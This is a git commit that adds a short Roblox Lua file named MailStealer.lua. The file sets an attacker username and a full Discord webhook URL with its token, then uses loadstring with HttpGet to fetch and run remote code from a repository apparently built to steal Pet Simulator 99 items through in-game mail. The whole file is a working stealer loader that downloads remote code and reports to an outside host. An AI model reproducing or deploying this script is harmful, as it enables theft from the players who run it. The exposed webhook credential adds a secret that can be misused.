1229681c6b30e6851d2200054e1e5f3834b3237b
Darkiooff <feliznavida130@gmail.com>
2025-04-17 12:06:55 -0400

    Create MailStealer.lua

---
+++ MailStealer.lua
@@ -0,0 +1,5 @@
+Username = "darkio_darkio"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1362457037153370163/ka3ZniqwHt4jGRXPcvTiuCURx395Jcge1k2ZeUsjlHG8xlWNU_u_7GlzT-4sJ0_qjsvO" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
